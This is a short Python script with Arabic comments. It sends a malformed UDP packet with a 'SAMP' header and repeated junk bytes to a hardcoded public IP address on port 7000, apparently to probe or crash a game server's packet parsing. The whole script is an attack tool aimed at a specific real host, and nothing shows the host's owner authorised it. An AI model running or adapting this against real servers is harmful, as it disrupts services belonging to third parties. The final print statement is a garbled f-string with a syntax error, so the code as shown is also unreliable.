import socket

# معلومات الهدف
TARGET_IP = "89.46.1.130"
TARGET_PORT = 7000

def send_malformed_packet():
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # بناء حزمة بمحتوى غير منتظم أو بيانات مبعثرة لاختبار الـ Parsing
    # يتم دمج علامات تفعيل وهمية وبايتات عشوائية طويلة لتجربة معالجة الاستثناءات
    malformed_payload = b'SAMP' + b'\x00\xFF\xFF\x00' * 32 + b'\x01\x02\x03\x04'
    
    try:
        print(f"جاري إرسال الحزمة غير المنتظمة إلى {TARGET_IP}:{TARGET_PORT}...")
        client.sendto(malformed_payload, (TARGET_IP, TARGET_PORT))
        print("تم إرسال الحزمة بنجاح. راقب استجابة السيرفر أو الـ Console.")
    except Exception as e:
        print(fُحدث خطأ أثناء الإرسال: {e}")
    finally:
        client.close()

if __name__ == "__main__":
    send_malformed_packet()
